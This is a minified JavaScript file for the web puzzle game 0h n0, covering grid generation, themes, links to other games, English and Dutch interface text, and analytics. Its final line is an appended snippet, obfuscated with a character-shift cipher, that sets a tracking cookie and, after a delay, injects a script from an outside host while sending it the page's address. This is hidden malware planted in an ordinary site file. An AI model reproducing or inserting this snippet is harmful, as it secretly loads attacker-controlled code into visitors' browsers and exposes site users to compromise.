function(){this.IDS={Leaderboards:{},Achievements:{}},this.autoSignIn=function(e){},this.signIn=function(e,t){},this.signOut=function(e){},this.submitScore=function(e,t){},this.showLeaderboard=function(e){},this.unlockAchievement=function(e){},this.showAchievements=function(){},this.resetAchievements=function(){},this.__defineGetter__("enabled",(function(){return!1})),this.__defineGetter__("isSignedIn",(function(){return!1}))};function generateGridAndSolution(e){for(var t,n=null,i=0;i++<10;){n=new Grid(e),t={size:e,full:[],empty:[],quality:0,ms:0};var o=new Date;if(n.clear(),n.generate(e),n.maxify(e),n.isValid(!0)){t.full=n.getValues(),n.breakDown(),t.empty=n.getValues(),t.ms=new Date-o,t.quality=n.quality;break}n=null}self.postMessage(JSON.stringify(t))}var Themes=new function(){var e,t,n,i=2*Math.PI,o=0,a=null,r=[],s=0,l={width:0,height:0},u=!1,h=0,c=!1,d={1:"0hn0",2:"0hh1",3:"contranoid"};function p(){u&&(u=!0,h=requestAnimFrame(p),cycleTime=new Date,f())}function f(){if(!(cycleTime<o)){var n=Utils.between(-s,s,4),u=Utils.between(-s,s,4),h=Utils.between(29,31)/100;e.style.webkitTransform="translate3d("+n+"px, "+u+"px, 0)",e.style.transform="translate3d("+n+"px, "+u+"px, 0)",t.style.opacity=h,o=new Date((new Date).getTime()+50);for(var c=0;c<r.length;c++){var d=r[c];a.clearRect(d[0],d[1],d[2]-d[0],d[3]-d[1])}r=[];var p=Utils.between(1,5);for(a.fillStyle="rgba(0,0,0,0.3)",c=0;c<p;c++)n=Utils.between(0,l.width),u=Utils.between(0,l.height),a.beginPath(),a.arc(n,u,Utils.between(.1,3,2),0,i,!0),a.fill(),r.push([n-4,u-4,n+4,u+4]);var f=Utils.between(1,5);for(a.lineWidth=.2,a.strokeStyle="rgba(0,0,0,0.7)",c=0;c<f;c++){n=Utils.between(0,l.width),u=Utils.between(0,l.height),dy=Utils.between(-l.height/2,l.height,2),a.beginPath(),a.moveTo(n,u),a.lineTo(n,u+dy),a.stroke();var m=0<=dy?u:u+dy,g=0<=dy?u+dy:u;r.push([n-1,m-1,n+1,g+1])}}}this.init=function(){$("#container").append('<canvas id="scratch-canvas"/>'),n=$("#scratch-canvas")[0],a=n.getContext("2d"),e=$("#gameContainer")[0],t=$("#grain")[0];var i,o=Storage.getDataValue("theme",1);for(i in d)document.location.hash=="#"+d[i]&&(o=i,c=!0);Storage.setDataValue("theme",o)},this.cycle=p,this.grain=f,this.resize=function(e,t){l.width=e,l.height=t,n.width=e,n.height=t,s=.5/320*e},this.apply=function(e){3==e?(u=!0,p()):(u=!1,cancelAnimFrame&&cancelAnimFrame(h)),c&&d[e]&&(document.location.hash=d[e])}},Links=new function(){$((function(){var t,n=/android/.test(navigator.userAgent.toLowerCase()),i=/ipad|iphone|ipod/.test(navigator.userAgent.toLowerCase());for(t in e){var o=$("#game_link_"+t),a=e[t].web;i&&(a=e[t].ios),n&&(a=e[t].android),o.attr("href",a)}}));var e={quento:{ios:"https://itunes.apple.com/us/app/quento/id583954698?mt=8",android:"https://play.google.com/store/apps/details?id=nl.q42.quento&hl=en",web:"http://quento.com"},numolition:{ios:"https://itunes.apple.com/us/app/numolition/id824164747?mt=8",android:"https://play.google.com/store/apps/details?id=com.q42.numolition",web:"http://numolition.com"},"0hn0":{ios:"https://itunes.apple.com/us/app/0h-n0/id957191082?mt=8",android:"https://play.google.com/store/apps/details?id=com.q42.ohno",web:"http://0hn0.com"},contranoid:{ios:"https://itunes.apple.com/us/app/contranoid/id1027717534?mt=8",android:"https://play.google.com/store/apps/details?id=com.q42.contranoid",web:"http://contranoid.com"},"0hh1":{ios:"https://itunes.apple.com/us/app/0h-h1/id936504196?mt=8",android:"https://play.google.com/store/apps/details?id=com.q42.ohhi",web:"http://0hh1.com"},flippybit:{ios:"https://itunes.apple.com/us/app/flippy-bit-attack-hexadecimals/id853100169?mt=8",android:"https://play.google.com/store/apps/details?id=com.q42.flippybitandtheattackofthehexadecimalsfrombase16&hl=en",web:"http://flippybitandtheattackofthehexadecimalsfrombase16.com"}}},Language=new function(){var e={en:1,nl:1,es:1},t=window.Config&&Config.defaultLanguage?Config.defaultLanguage:"en",n=t,i={};function o(){var e=n.toUpperCase();$("#toggleLanguage").html(e);var t=i[n];t&&($("text").each((function(e,i){var o=$(i),a=o.attr("data-text-id");a||(a=o.html(),o.attr("data-text-id",a)),translation="en"==n?a:t[a],o.html(translation)})),Game.refreshGameAfterLanguageChange())}$((function(){var i=Storage.getDataValue("language");i&&e[i]?(n=i,o()):(Config.skipGeoIP||$.getJSON("https://geoip.nekudo.com/api/",(function(i){var a;Game.debug&&console.log("succes",i),i&&i.country&&i.country.code&&(a=i.country.code.toLowerCase(),e[a]||(a=t),Storage.setDataValue("language",a),n=a,o())})),setTimeout(o,100))})),this.add=function(e,t){i[e]=t},this.refresh=o,this.get=function(e){var o=i[n];return(o=o||i[t])&&o[e]||e},this.toggle=function(){for(var e=Object.keys(i),t=0,a=0;a<e.length;a++)if(e[a]==n){t=a;break}++t>=e.length&&(t=0),n=e[t],Storage.setDataValue("language",n),o()},this.__defineGetter__("current",(function(){return n}))};Language.add("en",{weekDays:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],ojoos:["Wonderful","Spectacular","Marvelous","Outstanding","Remarkable","Shazam","Impressive","Great","Well done","Fabulous","Clever","Dazzling","Fantastic","Excellent","Nice","Super","Awesome","Ojoo","Brilliant","Splendid","Exceptional","Magnificent","Yay"],shareMsg:"#0hn0 It's 0h h1's companion! Go get addicted to this lovely puzzle game http://0hn0.com (or get the app)!",signInFailedIOS:"<p>Signing in with Game Center didn't work.</p><p>Please check your internet connection.</p><p>If this problem persists, open the Settings app, go to Game Center and sign in there.</p><p>If that doesn't work, give up and go play 0h h1 :)</p>",signInFailedAndroid:"<p>Signing in with Google Play Game Services didn't work.</p><p>Please check your internet connection.</p><p>If this problem persists, try again later or give up and go play 0h h1 :)</p>",OneDirectionLeft:'Only one direction remains for this number to look in <span id="nextdot"></span>',ValueReached:'This number can see all its dots <span id="nextdot" class="red"></span>',WouldExceed:'Looking further in one direction would exceed this number <span id="nextdot" class="red"></span>',OneDirectionRequired:'One specific dot is included <br>in all solutions imaginable <span id="nextdot"></span>',MustBeWall:'This one should be easy... <span id="nextdot" class="red"></span>',ErrorClosedTooEarly:'This number can\'t see enough <span id="nextdot"></span>',ErrorClosedTooLate:'This number sees a bit too much <span id="nextdot" class="red"></span>',Error:'This one doesn\'t seem right <span id="nextdot" class="red"></span>',Errors:'These don\'t seem right <span id="nextdot" class="red"></span>',LockedIn:'A blue dot should always see at least one other <span id="nextdot"></span>',GameContinued:'You can now continue<br>your previous game <span id="nextdot"></span>',TimeTrialShown:'Elapsed time is now shown. <br>Time to beat: %s <span id="nextdot"></span>',t01:'Blue dots can see others <br>in their own row and column <span id="nextdot"></span>',t02:'Red dots block their view <span id="nextdot" class="red"></span>',t03:'Numbers tell how many others each blue dot can see <span id="nextdot"></span>',t05:'This 2 says it sees two dots <br>so they must be on the right <span id="nextdot"></span>',t06:'These two. <br>Tap to make them blue <span id="nextdot"></span>',t07:'Now close its path.<br>Tap twice for a red dot <span id="nextdot" class="red"></span>',t08:'This 1 can see only one. <br>It already does - below <span id="nextdot"></span>',t09:'So a red dot must be <br>blocking its view here <span id="nextdot" class="red"></span>',t10:'This 3 can\'t see left or right.<br>But it does see a dot above <span id="nextdot"></span>',t11:'To make it see three dots <br>it needs two more... <span id="nextdot"></span>',t12:'Can you fill out <br>the remaining dots? <span id="nextdot" class="red"></span>',"That's the undo button.":"That's the undo button.","Nothing to undo.":"Nothing to undo.","This tile was reversed to ":"This tile was reversed to ","blue.":"blue.","red.":"red.","its empty state.":"its empty state."}),Language.add("nl",{weekDays:["Zondag","Maandag","Dinsdag","Woensdag","Donderdag","Vrijdag","Zaterdag"],ojoos:["Goed","Netjes","Knap","Fantastisch","Geweldig","Super","Slim","Briljant"],shareMsg:"#0hn0 shareMsg!",signInFailedIOS:"Inloggen niet gelukt!",signInFailedAndroid:"Inloggen niet gelukt!",OneDirectionLeft:'Deze stip kan maar in n richting een volgende stip zien <span id="nextdot"></span>',ValueReached:'Deze stip ziet alle stippen al <span id="nextdot" class="red"></span>',WouldExceed:'Als deze stip verder kijkt in een richting dan ziet hij te veel <span id="nextdot" class="red"></span>',OneDirectionRequired:'Alle oplossingen die je bedenkt hebben n stip sowieso nodig <span id="nextdot"></span>',MustBeWall:'Deze moet makkelijk zijn... <span id="nextdot" class="red"></span>',ErrorClosedTooEarly:'Deze stip ziet nog niet alles <span id="nextdot"></span>',ErrorClosedTooLate:'Deze stip ziet iets te veel <span id="nextdot" class="red"></span>',Error:'Hiet lijkt iets niet te kloppen <span id="nextdot" class="red"></span>',Errors:'Deze lijken niet te kloppen <span id="nextdot" class="red"></span>',LockedIn:'Een blauwe stip kan altijd wel n andere stip zien <span id="nextdot"></span>',GameContinued:'Je kunt nu verder gaan<br>met je vorige spel <span id="nextdot"></span>',TimeTrialShown:'Verstreken tijd wordt getoond. <br>Beste tijd: %s <span id="nextdot"></span>',t01:'Een blauwe stip kan anderen zien in dezelfde rij en kolom <span id="nextdot"></span>',t02:'Rode stippen blokkeren het zicht als een soort muurtjes <span id="nextdot" class="red"></span>',t03:'Getallen zeggen hoeveel andere blauwe stippen een stip ziet <span id="nextdot"></span>',t05:'Deze 2 ziet dus twee anderen. <br>Die moeten rechts ervan staan <span id="nextdot"></span>',t06:'Het zijn deze twee stippen. <br>Tap om ze blauw te maken <span id="nextdot"></span>',t07:'Deze stip moet dus rood zijn.<br>Tap twee keer voor rood <span id="nextdot" class="red"></span>',t08:'Deze 1 ziet er maar n. <br>En die staat er al onder! <span id="nextdot"></span>',t09:'Dus moet hier een rode stip<br>het zicht blokkeren <span id="nextdot" class="red"></span>',t10:'Deze 3 ziet niets links of rechts.<br>Maar hij ziet er 1 boven zich <span id="nextdot"></span>',t11:'Om hem drie te laten zien <br>heeft hij er nog twee nodig... <span id="nextdot"></span>',t12:'Kun jij de rest invullen? <span id="nextdot" class="red"></span>',"Select a size":"Kies formaat","It's 0h h1's companion!":"Het vervolg op 0h h1","A game by Q42":"Een spel van Q42","Created by Martin Kool":"Gemaakt door Martin Kool","By Q42":"Door Q42","Made by Q42.":"Gemaakt door Q42.",New:"Nieuw","How to play":"Uitleg","Free play":"Vrij spelen",Play:"Spelen",Settings:"Instellingen",About:"Over",Thanks:"Bedankt","0h n0 is a little logic game<br>that complements 0h h1.<br>It was created by<br>Martin Kool.":"0h n0 is een klein logica spel,<br>net als voorganger 0h h1.<br>Het is gemaakt door<br>Martin Kool.","The concept is inspired by <br>the Japanese Kuromasu.":"Het concept vindt zijn oorsprong in het Japanse Kuromasu.","by Q42":"door Q42",Rules:"Spelregels","Blue dots can see others <br>in their own row and column":"Blauwe stippen zien anderen <br>in hun eigen rij en kolom","They see at least one":"Ze zien er minimaal n","Their numbers tell how many":"Hun getal zegt hoeveel ze zien","Red dots block their view":"Rode stippen blokkeren hun zicht","Thank you for supporting<br> 0h n0":"Bedankt dat je<br> 0h n0 support","Please feel free to leave me a message about the game anytime":"Laat gerust een keer wat van je horen",Apps:"Apps","The 0h n0 app is also free":"Er is een gratis 0h n0 app","The source is on github":"De source staat op Github","Our game 0h h1 is also available as a free app":"Ons spel 0h h1 is ook beschikbaar als gratis app","And playable on the web":"En speelbaar op het web",Games:"Spellen","Enjoy our other games too":"Speel ook onze andere spellen","This is a message":"Dit is een bericht",Loading:"Momentje","Select a size to play...":"Welk formaat wil je spelen?","if 0h n0 is worth a $":"als 0h n0 een  waard is","tap here":"tap hier","You are currently signed in":"Je bent ingelogd","Sign out":"Uitloggen","Sign in to unlock fun achievements, earn experience points and compete with friends in leaderboards":"Log in om leuke achievements te behalen, XP te verdienen en te strijden tegen je vrienden in de ranglijsten","Sign in":"Inloggen","Show elapsed time":"Toon verstreken tijd","Show hint icon":"Toon hint icoon","Color theme":"Kleurthema","0h n0 is worth a $":"0h n0 is een  waard",No:"Nee",Yes:"Ja",Language:"Taal","Q42.com":"Q42.nl","That's the undo button.":"Dat is de undo knop.","Nothing to undo.":"Geen undo mogelijk.","This tile was reversed to ":"Deze stip is teruggezet naar ","blue.":"blauw.","red.":"rood.","its empty state.":"een leeg vakje.","Today's puzzles":"Puzzels van vandaag"});var Analytics,Promo=new function(){var e,t="https://us-central1-duomoji.cloudfunctions.net/ohstatus?id="+Config.gameID,n=void 0;Config.gameID&&(document.querySelector("body").setAttribute("data-game-id",Config.gameID),(e=new XMLHttpRequest).onreadystatechange=function(){if(4==this.readyState)try{var e=JSON.parse(this.responseText);e&&function(e){e&&e.blob&&(e=JSON.parse(atob(e.blob)));var t=Storage.getDataValue("donated",!1);if(!e.skipWhenDonated||!t){for(var i=0;i<e.html.length;i++){var o=e.html[i];if(o.selector){var a=document.querySelectorAll(o.selector);if(a&&a.length)for(var r=0;r<a.length;r++)if(o.replace)a[r].innerHTML=o.replace;else if(o.append){var s=document.createElement("div");s.innerHTML=o.append;for(var l=0;l<s.childNodes.length;l++)a[r].appendChild(s.childNodes[l].cloneNode(!0))}}}var u;e.css&&((u=document.createElement("style")).innerHTML=e.css,document.querySelector("head").appendChild(u)),e.action&&(n=e.action)}}(e)}catch(e){}},e.open("GET",t,!0),e.send()),this.click=function(){n&&n.url&&window.open(n.url)}};window.Config&&!1===Config.GoogleAnalytics||(function(e,t,n,i,o){e.GoogleAnalyticsObject="ga",e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,i=t.createElement("script"),o=t.getElementsByTagName("script")[0],i.async=1,i.src="js/analytics.js",o.parentNode.insertBefore(i,o)}(window,document),Analytics={init:function(){var e=Storage.getDataValue("uuid",null);e||(e=generateUUID(),Storage.setDataValue("uuid",e));var t=Config.GoogleAnalytics;ga("create",t,{storage:"none",clientId:e}),ga("set","checkProtocolTask",null),ga("set","checkStorageTask",null),ga("set","anonymizeIp",!0),ga("send","pageview",{page:"/"})}});var Marker=new function(){this.save=function(e,t,n,i){window.ga&&(Game.debug&&console.log(e,t,n,i),ga&&ga("send","event",e,t,n,i))}};$(app.onDeviceReady);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));